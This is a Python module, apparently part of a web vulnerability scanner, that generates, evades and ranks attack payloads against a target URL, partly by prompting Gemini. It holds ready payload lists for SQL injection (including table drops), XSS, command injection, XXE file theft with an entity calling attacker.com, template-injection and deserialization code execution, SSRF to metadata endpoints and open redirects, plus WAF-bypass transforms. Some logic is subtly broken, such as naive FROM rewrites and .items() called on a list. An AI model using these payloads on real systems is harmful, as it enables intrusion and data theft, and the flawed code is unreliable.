import urllib.parse
import json
import os
import re
import random
from typing import Dict, List, Optional, Any, Tuple
from app.clients.gemini_client import GeminiClient


class AdvancedPayloadGenerator:
    """Advanced payload generator with context-aware and evasion techniques"""
    
    def __init__(self):
        self.gemini_client = GeminiClient()
        self.evasion_techniques = self._load_evasion_techniques()
        self.context_patterns = self._load_context_patterns()
    
    def generate_context_aware_payloads(self, vulnerability_type: str, target_url: str, context: str = "") -> List[Dict[str, Any]]:
        """Generate context-aware payloads based on target and context"""
        try:
            # Analyze target URL and context
            target_analysis = self._analyze_target(target_url, context)
            
            # Generate base payloads
            base_payloads = self._get_base_payloads(vulnerability_type)
            
            # Apply context-aware modifications
            context_payloads = self._apply_context_modifications(base_payloads, target_analysis)
            
            # Apply evasion techniques
            evasion_payloads = self._apply_evasion_techniques(context_payloads, target_analysis)
            
            # Generate advanced payloads using LLM
            llm_payloads = self._generate_llm_payloads(vulnerability_type, target_analysis, context)
            
            # Combine and rank payloads
            all_payloads = base_payloads + context_payloads + evasion_payloads + llm_payloads
            ranked_payloads = self._rank_payloads(all_payloads, target_analysis)
            
            return ranked_payloads[:15]  # Return top 15 payloads
            
        except Exception as e:
            return self._get_fallback_payloads(vulnerability_type)
    
    def _analyze_target(self, target_url: str, context: str) -> Dict[str, Any]:
        """Analyze target URL and context for payload customization"""
        analysis = {
            'url': target_url,
            'context': context,
            'technology_stack': self._detect_technology_stack(target_url, context),
            'parameter_types': self._detect_parameter_types(target_url, context),
            'encoding_requirements': self._detect_encoding_requirements(target_url, context),
            'filter_bypass_techniques': self._detect_filter_bypass_techniques(target_url, context),
            'injection_points': self._detect_injection_points(target_url, context)
        }
        return analysis
    
    def _detect_technology_stack(self, target_url: str, context: str) -> List[str]:
        """Detect technology stack from URL and context"""
        technologies = []
        
        # URL-based detection
        if 'asp' in target_url.lower() or 'aspx' in target_url.lower():
            technologies.append('ASP.NET')
        if 'php' in target_url.lower():
            technologies.append('PHP')
        if 'jsp' in target_url.lower():
            technologies.append('JSP')
        if 'python' in target_url.lower() or 'django' in target_url.lower():
            technologies.append('Python')
        if 'node' in target_url.lower() or 'express' in target_url.lower():
            technologies.append('Node.js')
        
        # Context-based detection
        if 'mysql' in context.lower():
            technologies.append('MySQL')
        if 'postgresql' in context.lower() or 'postgres' in context.lower():
            technologies.append('PostgreSQL')
        if 'oracle' in context.lower():
            technologies.append('Oracle')
        if 'mssql' in context.lower() or 'sql server' in context.lower():
            technologies.append('SQL Server')
        
        return technologies if technologies else ['Unknown']
    
    def _detect_parameter_types(self, target_url: str, context: str) -> List[str]:
        """Detect parameter types from URL and context"""
        param_types = []
        
        # URL parameter analysis
        if '?' in target_url:
            params = target_url.split('?')[1].split('&')
            for param in params:
                if '=' in param:
                    key, value = param.split('=', 1)
                    if value.isdigit():
                        param_types.append('numeric')
                    elif value.lower() in ['true', 'false']:
                        param_types.append('boolean')
                    else:
                        param_types.append('string')
        
        # Context analysis
        if 'id' in context.lower() or 'user_id' in context.lower():
            param_types.append('id')
        if 'search' in context.lower() or 'query' in context.lower():
            param_types.append('search')
        if 'file' in context.lower() or 'path' in context.lower():
            param_types.append('file_path')
        
        return param_types if param_types else ['string']
    
    def _detect_encoding_requirements(self, target_url: str, context: str) -> List[str]:
        """Detect encoding requirements"""
        encodings = ['url', 'html', 'base64']
        
        if 'json' in context.lower():
            encodings.append('json')
        if 'xml' in context.lower():
            encodings.append('xml')
        if 'utf-8' in context.lower():
            encodings.append('utf8')
        
        return encodings
    
    def _detect_filter_bypass_techniques(self, target_url: str, context: str) -> List[str]:
        """Detect potential filter bypass techniques"""
        techniques = ['case_variation', 'encoding', 'comment_insertion']
        
        if 'waf' in context.lower() or 'firewall' in context.lower():
            techniques.extend(['double_encoding', 'unicode_encoding', 'chunked_encoding'])
        
        if 'filter' in context.lower() or 'sanitize' in context.lower():
            techniques.extend(['null_byte', 'whitespace_variation', 'keyword_splitting'])
        
        return techniques
    
    def _detect_injection_points(self, target_url: str, context: str) -> List[str]:
        """Detect potential injection points"""
        injection_points = []
        
        if 'login' in target_url.lower() or 'auth' in target_url.lower():
            injection_points.extend(['username', 'password', 'email'])
        
        if 'search' in target_url.lower():
            injection_points.append('search_query')
        
        if 'file' in target_url.lower() or 'download' in target_url.lower():
            injection_points.append('file_path')
        
        if 'api' in target_url.lower():
            injection_points.extend(['api_key', 'token', 'parameter'])
        
        return injection_points if injection_points else ['parameter']
    
    def _get_base_payloads(self, vulnerability_type: str) -> List[Dict[str, Any]]:
        """Get base payloads for vulnerability type"""
        payloads = load_payloads()
        vuln_payloads = payloads.get(vulnerability_type, {}).get('payloads', [])
        
        result = []
        for payload in vuln_payloads:
            result.append({
                'payload': payload,
                'category': 'base',
                'complexity': 'basic',
                'evasion_level': 0,
                'description': f'Base {vulnerability_type} payload',
                'success_probability': 0.7
            })
        
        return result
    
    def _apply_context_modifications(self, payloads: List[Dict[str, Any]], target_analysis: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Apply context-aware modifications to payloads"""
        modified_payloads = []
        
        for payload_data in payloads:
            base_payload = payload_data['payload']
            
            # Technology-specific modifications
            for tech in target_analysis['technology_stack']:
                if tech == 'MySQL':
                    modified_payload = self._modify_for_mysql(base_payload)
                elif tech == 'PostgreSQL':
                    modified_payload = self._modify_for_postgresql(base_payload)
                elif tech == 'Oracle':
                    modified_payload = self._modify_for_oracle(base_payload)
                elif tech == 'SQL Server':
                    modified_payload = self._modify_for_sqlserver(base_payload)
                else:
                    modified_payload = base_payload
                
                if modified_payload != base_payload:
                    modified_payloads.append({
                        'payload': modified_payload,
                        'category': 'context_modified',
                        'complexity': 'intermediate',
                        'evasion_level': 1,
                        'description': f'Modified for {tech}',
                        'success_probability': 0.8,
                        'technology': tech
                    })
        
        return modified_payloads
    
    def _modify_for_mysql(self, payload: str) -> str:
        """Modify payload for MySQL-specific syntax"""
        modifications = {
            '--': '#',
            'UNION': 'UNION ALL',
            'SELECT': 'SELECT',
            'FROM': 'FROM information_schema.tables'
        }
        
        modified = payload
        for old, new in modifications.items():
            modified = modified.replace(old, new)
        
        return modified
    
    def _modify_for_postgresql(self, payload: str) -> str:
        """Modify payload for PostgreSQL-specific syntax"""
        modifications = {
            '--': '--',
            'UNION': 'UNION',
            'SELECT': 'SELECT',
            'FROM': 'FROM pg_tables'
        }
        
        modified = payload
        for old, new in modifications.items():
            modified = modified.replace(old, new)
        
        return modified
    
    def _modify_for_oracle(self, payload: str) -> str:
        """Modify payload for Oracle-specific syntax"""
        modifications = {
            '--': '--',
            'UNION': 'UNION',
            'SELECT': 'SELECT',
            'FROM': 'FROM all_tables'
        }
        
        modified = payload
        for old, new in modifications.items():
            modified = modified.replace(old, new)
        
        return modified
    
    def _modify_for_sqlserver(self, payload: str) -> str:
        """Modify payload for SQL Server-specific syntax"""
        modifications = {
            '--': '--',
            'UNION': 'UNION',
            'SELECT': 'SELECT',
            'FROM': 'FROM sysobjects'
        }
        
        modified = payload
        for old, new in modifications.items():
            modified = modified.replace(old, new)
        
        return modified
    
    def _apply_evasion_techniques(self, payloads: List[Dict[str, Any]], target_analysis: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Apply evasion techniques to payloads"""
        evasion_payloads = []
        
        for payload_data in payloads:
            base_payload = payload_data['payload']
            
            # Apply different evasion techniques
            for technique in target_analysis['filter_bypass_techniques']:
                if technique == 'case_variation':
                    evaded_payload = self._apply_case_variation(base_payload)
                elif technique == 'encoding':
                    evaded_payload = self._apply_encoding(base_payload)
                elif technique == 'comment_insertion':
                    evaded_payload = self._apply_comment_insertion(base_payload)
                elif technique == 'double_encoding':
                    evaded_payload = self._apply_double_encoding(base_payload)
                elif technique == 'unicode_encoding':
                    evaded_payload = self._apply_unicode_encoding(base_payload)
                elif technique == 'null_byte':
                    evaded_payload = self._apply_null_byte(base_payload)
                else:
                    evaded_payload = base_payload
                
                if evaded_payload != base_payload:
                    evasion_payloads.append({
                        'payload': evaded_payload,
                        'category': 'evasion',
                        'complexity': 'advanced',
                        'evasion_level': 2,
                        'description': f'Evasion technique: {technique}',
                        'success_probability': 0.6,
                        'evasion_technique': technique
                    })
        
        return evasion_payloads
    
    def _apply_case_variation(self, payload: str) -> str:
        """Apply case variation to payload"""
        # Randomly change case of keywords
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'INSERT', 'UPDATE', 'DELETE']
        modified = payload
        
        for keyword in keywords:
            if keyword.upper() in modified.upper():
                # Randomly choose case variation
                variations = [keyword.upper(), keyword.lower(), keyword.capitalize()]
                chosen = random.choice(variations)
                modified = re.sub(keyword, chosen, modified, flags=re.IGNORECASE)
        
        return modified
    
    def _apply_encoding(self, payload: str) -> str:
        """Apply URL encoding to payload"""
        return urllib.parse.quote(payload)
    
    def _apply_comment_insertion(self, payload: str) -> str:
        """Insert comments to bypass filters"""
        # Insert comments between keywords
        modified = payload
        comment_chars = ['/**/', '--', '#']
        
        for char in comment_chars:
            if 'SELECT' in modified.upper():
                modified = modified.replace('SELECT', f'SELECT{char}', 1)
            if 'UNION' in modified.upper():
                modified = modified.replace('UNION', f'UNION{char}', 1)
        
        return modified
    
    def _apply_double_encoding(self, payload: str) -> str:
        """Apply double URL encoding"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def _apply_unicode_encoding(self, payload: str) -> str:
        """Apply Unicode encoding"""
        # Simple Unicode encoding example
        return payload.encode('unicode_escape').decode('ascii')
    
    def _apply_null_byte(self, payload: str) -> str:
        """Apply null byte injection"""
        return payload + '%00'
    
    def _generate_llm_payloads(self, vulnerability_type: str, target_analysis: Dict[str, Any], context: str) -> List[Dict[str, Any]]:
        """Generate advanced payloads using LLM"""
        try:
            prompt = f"""
            Generate 5 advanced payloads for {vulnerability_type} vulnerability testing.
            
            Target Analysis:
            - URL: {target_analysis['url']}
            - Technology Stack: {', '.join(target_analysis['technology_stack'])}
            - Parameter Types: {', '.join(target_analysis['parameter_types'])}
            - Injection Points: {', '.join(target_analysis['injection_points'])}
            - Context: {context}
            
            Generate payloads that are:
            1. Specific to the detected technology stack
            2. Appropriate for the parameter types
            3. Advanced and evasive
            4. Contextually relevant
            
            Return JSON format:
            {{
                "payloads": [
                    {{
                        "payload": "actual_payload",
                        "description": "what this payload tests",
                        "complexity": "advanced",
                        "success_probability": 0.8
                    }}
                ]
            }}
            """
            
            response = self.gemini_client.generate_content(prompt)
            if response and response.text:
                try:
                    data = json.loads(response.text)
                    llm_payloads = []
                    for payload_data in data.get('payloads', []):
                        llm_payloads.append({
                            'payload': payload_data['payload'],
                            'category': 'llm_generated',
                            'complexity': payload_data.get('complexity', 'advanced'),
                            'evasion_level': 3,
                            'description': payload_data.get('description', 'LLM generated payload'),
                            'success_probability': payload_data.get('success_probability', 0.7)
                        })
                    return llm_payloads
                except json.JSONDecodeError:
                    return []
            else:
                return []
                
        except Exception as e:
            return []
    
    def _rank_payloads(self, payloads: List[Dict[str, Any]], target_analysis: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Rank payloads by effectiveness and relevance"""
        def calculate_score(payload_data):
            score = 0
            
            # Base score from success probability
            score += payload_data.get('success_probability', 0.5) * 40
            
            # Complexity bonus
            complexity = payload_data.get('complexity', 'basic')
            if complexity == 'advanced':
                score += 20
            elif complexity == 'intermediate':
                score += 10
            
            # Evasion level bonus
            evasion_level = payload_data.get('evasion_level', 0)
            score += evasion_level * 5
            
            # Technology match bonus
            if 'technology' in payload_data:
                if payload_data['technology'] in target_analysis['technology_stack']:
                    score += 15
            
            # Category bonus
            category = payload_data.get('category', 'base')
            if category == 'llm_generated':
                score += 10
            elif category == 'evasion':
                score += 8
            elif category == 'context_modified':
                score += 5
            
            return score
        
        # Sort by score (descending)
        ranked_payloads = sorted(payloads, key=calculate_score, reverse=True)
        
        # Add ranking information
        for i, payload_data in enumerate(ranked_payloads):
            payload_data['rank'] = i + 1
            payload_data['effectiveness_score'] = calculate_score(payload_data)
        
        return ranked_payloads
    
    def _get_fallback_payloads(self, vulnerability_type: str) -> List[Dict[str, Any]]:
        """Get fallback payloads when advanced generation fails"""
        fallback_payloads = {
            'sql_injection': [
                {'payload': "' OR '1'='1", 'description': 'Basic SQL injection bypass'},
                {'payload': "'; DROP TABLE users; --", 'description': 'SQL injection with table drop'},
                {'payload': "1' UNION SELECT username, password FROM users--", 'description': 'SQL injection with UNION SELECT'}
            ],
            'xss': [
                {'payload': "<script>alert('XSS')</script>", 'description': 'Basic XSS payload'},
                {'payload': "<img src=x onerror=alert('XSS')>", 'description': 'XSS with image tag'},
                {'payload': "javascript:alert('XSS')", 'description': 'XSS with javascript protocol'}
            ],
            'path_traversal': [
                {'payload': "../../../etc/passwd", 'description': 'Path traversal to read /etc/passwd'},
                {'payload': "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", 'description': 'Path traversal on Windows'},
                {'payload': "....//....//....//etc/passwd", 'description': 'Path traversal with double encoding'}
            ]
        }
        
        payloads = fallback_payloads.get(vulnerability_type, [])
        result = []
        for payload_data in payloads:
            result.append({
                'payload': payload_data['payload'],
                'category': 'fallback',
                'complexity': 'basic',
                'evasion_level': 0,
                'description': payload_data['description'],
                'success_probability': 0.5,
                'rank': len(result) + 1,
                'effectiveness_score': 30
            })
        
        return result
    
    def _load_evasion_techniques(self) -> Dict[str, List[str]]:
        """Load evasion techniques database"""
        return {
            'sql_injection': [
                'case_variation', 'comment_insertion', 'encoding', 'double_encoding',
                'unicode_encoding', 'null_byte', 'whitespace_variation', 'keyword_splitting'
            ],
            'xss': [
                'case_variation', 'encoding', 'unicode_encoding', 'event_handler_variation',
                'tag_variation', 'attribute_variation', 'protocol_variation'
            ],
            'path_traversal': [
                'encoding', 'double_encoding', 'unicode_encoding', 'null_byte',
                'directory_separator_variation', 'case_variation'
            ]
        }
    
    def _load_context_patterns(self) -> Dict[str, Dict[str, Any]]:
        """Load context patterns for payload customization"""
        return {
            'login_forms': {
                'parameters': ['username', 'password', 'email'],
                'technologies': ['PHP', 'ASP.NET', 'JSP'],
                'payload_types': ['sql_injection', 'xss']
            },
            'search_forms': {
                'parameters': ['q', 'query', 'search'],
                'technologies': ['PHP', 'Python', 'Node.js'],
                'payload_types': ['xss', 'sql_injection']
            },
            'file_operations': {
                'parameters': ['file', 'path', 'filename'],
                'technologies': ['PHP', 'Python', 'Java'],
                'payload_types': ['path_traversal', 'command_injection']
            }
        }


def load_payloads() -> Dict[str, Any]:
    """Load payloads from JSON file with comprehensive payloads"""
    try:
        payload_file = os.path.join(os.path.dirname(__file__), '..', 'data', 'payloads_expanded.json')
        with open(payload_file, 'r', encoding='utf-8') as f:
            payloads = json.load(f)
        
        # Add comprehensive payloads if not present
        if not payloads:
            payloads = _get_comprehensive_payloads()
        
        return payloads
    except Exception:
        return _get_comprehensive_payloads()


def _get_comprehensive_payloads() -> Dict[str, Any]:
    """Get comprehensive payloads for all vulnerability types"""
    return {
        "path_traversal": {
            "payloads": [
                "../../../../etc/passwd",
                "..%2f..%2f..%2f..%2fetc%2fpasswd",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "/var/www/html/../../etc/passwd",
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
            ],
            "description": "Path Traversal payloads to access system files",
            "owasp": "A01:2021-Broken Access Control",
            "severity": "High",
            "remediation": "Validate and sanitize file paths, use whitelist-based file access"
        },
        "command_injection": {
            "payloads": [
                "; id",
                "| whoami",
                "& dir",
                "` cat /etc/passwd `",
                "$(whoami)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "& type C:\\windows\\system32\\drivers\\etc\\hosts",
                "; ls -la",
                "| ls -la",
                "& ls -la",
                "` ls -la `",
                "$(ls -la)",
                "; uname -a",
                "| uname -a",
                "& uname -a"
            ],
            "description": "Command Injection payloads to execute system commands",
            "owasp": "A03:2021-Injection",
            "severity": "Critical",
            "remediation": "Avoid executing system commands with user input, use safe APIs"
        },
        "ldap_injection": {
            "payloads": [
                "*)(uid=*",
                "*)(|(uid=*",
                "*)(|(objectClass=*",
                "*)(|(cn=*",
                "*)(|(mail=*",
                "*)(|(sn=*",
                "*)(|(givenName=*",
                "*)(|(telephoneNumber=*",
                "*)(|(userPassword=*",
                "*)(|(description=*"
            ],
            "description": "LDAP Injection payloads to bypass authentication and access data",
            "owasp": "A03:2021-Injection",
            "severity": "High",
            "remediation": "Use parameterized LDAP queries and input validation"
        },
        "xml_injection": {
            "payloads": [
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///proc/version\">]><root>&xxe;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://attacker.com/steal\">]><root>&xxe;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///C:/windows/system32/drivers/etc/hosts\">]><root>&xxe;</root>",
                "<!DOCTYPE root [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"data://text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">]><root>&xxe;</root>"
            ],
            "description": "XML Injection payloads for XXE attacks and data exfiltration",
            "owasp": "A05:2021-Security Misconfiguration",
            "severity": "High",
            "remediation": "Disable external entity processing, use safe XML parsers"
        },
        "sql_injection": {
            "payloads": [
                "' OR '1'='1' --",
                "' UNION SELECT 1,2,3,4,5 --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
                "' OR 1=1 --",
                "admin'--",
                "' OR 'x'='x",
                "' UNION SELECT username, password FROM users --",
                "' AND SLEEP(5) --",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --",
                "'; DROP TABLE users; --"
            ],
            "description": "SQL Injection payloads for database manipulation",
            "owasp": "A03:2021-Injection",
            "severity": "Critical",
            "remediation": "Use parameterized queries and input validation"
        },
        "reflected_xss": {
            "payloads": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>"
            ],
            "description": "Cross-Site Scripting payloads for client-side attacks",
            "owasp": "A03:2021-Injection",
            "severity": "Medium",
            "remediation": "Implement output encoding and input validation"
        },
        "ssrf": {
            "payloads": [
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost:8080/admin",
                "file:///etc/passwd",
                "gopher://127.0.0.1:25/_SMTP%20COMMAND",
                "dict://127.0.0.1:11211/",
                "ldap://127.0.0.1:389/",
                "http://[::1]:22/",
                "http://0.0.0.0:22/",
                "http://127.0.0.1:3306/"
            ],
            "description": "Server-Side Request Forgery payloads for internal network access",
            "owasp": "A10:2021-Server-Side Request Forgery",
            "severity": "High",
            "remediation": "Validate and whitelist allowed URLs, disable internal network access"
        },
        "nosql_injection": {
            "payloads": [
                "{\"$ne\": null}",
                "{\"$gt\": \"\"}",
                "{\"$regex\": \".*\"}",
                "{\"$where\": \"this.password == this.username\"}",
                "{\"$or\": [{\"username\": \"admin\"}, {\"username\": \"administrator\"}]}",
                "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
                "{\"$where\": \"function(){return true}\"}",
                "{\"$where\": \"this.username == 'admin' && this.password == 'admin'\"}",
                "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}",
                "{\"$or\": [{\"username\": {\"$regex\": \".*\"}}, {\"password\": {\"$regex\": \".*\"}}]}"
            ],
            "description": "NoSQL Injection payloads for database manipulation",
            "owasp": "A03:2021-Injection",
            "severity": "High",
            "remediation": "Use parameterized queries and input validation for NoSQL databases"
        },
        "template_injection": {
            "payloads": [
                "{{7*7}}",
                "{{config}}",
                "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{lipsum.__globals__.os.popen('id').read()}}",
                "{{cycler.__init__.__globals__.os.popen('id').read()}}",
                "{{joiner.__init__.__globals__.os.popen('id').read()}}",
                "{{namespace.__init__.__globals__.os.popen('id').read()}}",
                "{{url_for.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ],
            "description": "Template Injection payloads for server-side code execution",
            "owasp": "A03:2021-Injection",
            "severity": "Critical",
            "remediation": "Use safe template engines and sandbox template execution"
        },
        "deserialization": {
            "payloads": [
                "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"data\";}",
                "a:1:{s:4:\"test\";s:4:\"data\";}",
                "{\"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\"MethodName\":\"Start\",\"ObjectInstance\":{\"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\"StartInfo\":{\"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\"FileName\":\"cmd\",\"Arguments\":\"/c whoami\"}}}",
                "java.io.ObjectInputStream@4f023edb",
                "java.util.HashMap@7d4991ad",
                "java.lang.Runtime@1b6d3586",
                "com.sun.rowset.JdbcRowSetImpl@7852e922"
            ],
            "description": "Deserialization payloads for remote code execution",
            "owasp": "A08:2021-Software and Data Integrity Failures",
            "severity": "Critical",
            "remediation": "Avoid deserializing untrusted data, use safe deserialization methods"
        },
        "open_redirect": {
            "payloads": [
                "https://evil.com",
                "//evil.com",
                "/\\evil.com",
                "http://evil.com",
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "ftp://evil.com",
                "file://evil.com",
                "gopher://evil.com",
                "ldap://evil.com"
            ],
            "description": "Open Redirect payloads for phishing attacks",
            "owasp": "A01:2021-Broken Access Control",
            "severity": "Medium",
            "remediation": "Validate redirect URLs and use whitelist-based redirects"
        }
    }


# Legacy payloads for backward compatibility
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
]

SQLI_PAYLOADS = [
    "' OR '1'='1' --",
    "' UNION SELECT 1,2,3 --",
    "' AND SLEEP(3) --",
    "admin'--",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://example.com",
    "//evil.com",
    "/\\\\evil.com",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
]


def suggest_payloads(baseline_finding: dict, vulnerability_type: str = None) -> List[Dict[str, Any]]:
    """
    Suggest payloads based on vulnerability type or baseline finding
    Returns structured payload data with categories
    """
    title = (baseline_finding.get('title') or '').lower()
    parameter = baseline_finding.get('parameter') or 'q'
    base_url = baseline_finding.get('url') or ''
    
    # Load payloads from JSON
    payloads_db = load_payloads()
    
    # Determine vulnerability type
    if vulnerability_type:
        vuln_type = vulnerability_type.lower()
    else:
        vuln_type = _detect_vulnerability_type(title)
    
    suggestions = []
    
    if vuln_type in payloads_db:
        vuln_data = payloads_db[vuln_type]
        for category, payloads in vuln_data.get('payloads', {}).items():
            for payload in payloads:
                suggestion = {
                    'payload': payload,
                    'category': category,
                    'vulnerability_type': vuln_type,
                    'severity': vuln_data.get('severity', 'Unknown'),
                    'owasp': vuln_data.get('owasp', 'Unknown'),
                    'description': vuln_data.get('description', ''),
                    'url': _inject_param(base_url, parameter, payload),
                    'parameter': parameter
                }
                suggestions.append(suggestion)
    else:
        # Fallback to legacy detection
        suggestions = _legacy_suggest_payloads(baseline_finding)
    
    return suggestions


def _detect_vulnerability_type(title: str) -> str:
    """Detect vulnerability type from title"""
    title_lower = title.lower()
    
    if any(keyword in title_lower for keyword in ['xss', 'cross-site scripting', 'script injection']):
        return 'xss'
    elif any(keyword in title_lower for keyword in ['sql', 'injection', 'sqli']):
        return 'sql_injection'
    elif any(keyword in title_lower for keyword in ['path', 'traversal', 'directory']):
        return 'path_traversal'
    elif any(keyword in title_lower for keyword in ['redirect', 'open redirect']):
        return 'open_redirect'
    elif any(keyword in title_lower for keyword in ['command', 'cmd', 'exec']):
        return 'command_injection'
    elif any(keyword in title_lower for keyword in ['ldap']):
        return 'ldap_injection'
    elif any(keyword in title_lower for keyword in ['xml', 'xxe']):
        return 'xml_injection'
    elif any(keyword in title_lower for keyword in ['ssrf', 'server-side request forgery']):
        return 'ssrf'
    elif any(keyword in title_lower for keyword in ['nosql', 'mongodb', 'couchdb']):
        return 'nosql_injection'
    elif any(keyword in title_lower for keyword in ['template', 'ssti']):
        return 'template_injection'
    elif any(keyword in title_lower for keyword in ['deserialization', 'unserialize']):
        return 'deserialization'
    else:
        return 'unknown'


def _legacy_suggest_payloads(baseline_finding: dict) -> List[Dict[str, Any]]:
    """Legacy payload suggestion for backward compatibility"""
    title = (baseline_finding.get('title') or '').lower()
    parameter = baseline_finding.get('parameter') or 'q'
    base_url = baseline_finding.get('url') or ''

    suggestions = []
    if 'xss' in title or 'cross-site scripting' in title:
        for p in XSS_PAYLOADS:
            suggestions.append({
                'payload': p,
                'category': 'basic',
                'vulnerability_type': 'xss',
                'severity': 'High',
                'owasp': 'A03:2023-Injection',
                'description': 'Cross-Site Scripting payload',
                'url': _inject_param(base_url, parameter, p),
                'parameter': parameter
            })
    if 'sql' in title or 'injection' in title:
        for p in SQLI_PAYLOADS:
            suggestions.append({
                'payload': p,
                'category': 'basic',
                'vulnerability_type': 'sql_injection',
                'severity': 'Critical',
                'owasp': 'A03:2023-Injection',
                'description': 'SQL Injection payload',
                'url': _inject_param(base_url, parameter, p),
                'parameter': parameter
            })
    if 'redirect' in title:
        for p in OPEN_REDIRECT_PAYLOADS:
            suggestions.append({
                'payload': p,
                'category': 'basic',
                'vulnerability_type': 'open_redirect',
                'severity': 'Medium',
                'owasp': 'A01:2023-Broken Access Control',
                'description': 'Open Redirect payload',
                'url': _inject_param(base_url, parameter or 'next', p),
                'parameter': parameter or 'next'
            })
    if 'path' in title or 'traversal' in title:
        for p in PATH_TRAVERSAL_PAYLOADS:
            suggestions.append({
                'payload': p,
                'category': 'basic',
                'vulnerability_type': 'path_traversal',
                'severity': 'High',
                'owasp': 'A01:2023-Broken Access Control',
                'description': 'Path Traversal payload',
                'url': _inject_param(base_url, parameter or 'file', p),
                'parameter': parameter or 'file'
            })
    
    return suggestions


def get_payloads_by_type(vulnerability_type: str) -> Dict[str, Any]:
    """Get all payloads for a specific vulnerability type"""
    payloads_db = load_payloads()
    return payloads_db.get(vulnerability_type.lower(), {})


def get_all_vulnerability_types() -> List[str]:
    """Get list of all supported vulnerability types"""
    payloads_db = load_payloads()
    return list(payloads_db.keys())


def _inject_param(url: str, name: str, value: str):
    if not url:
        return None
    if '?' in url:
        base, _ = url.split('?', 1)
        return f"{base}?{name}={urllib.parse.quote(value)}"
    return f"{url}?{name}={urllib.parse.quote(value)}"


def augment_with_llm(findings_payload: dict, max_payloads: int = 10):
    try:
        from app.clients import GeminiClient
        client = GeminiClient()
    except Exception:
        client = None
    if not client:
        return None
    prompt = (
        "Đề xuất tối đa 10 payload để kiểm thử lỗ hổng dựa trên request/response bên dưới. "
        "Trả về JSON: {\"payloads\":[\"...\"]}. Chỉ trả JSON.\n\n" +
        str(findings_payload)[:6000]
    )
    try:
        resp = client.chat(prompt, max_output_tokens=400)
        import json as _json
        data = _json.loads(resp)
        pls = data.get('payloads', []) if isinstance(data, dict) else []
        return pls[:max_payloads]
    except Exception:
        return None


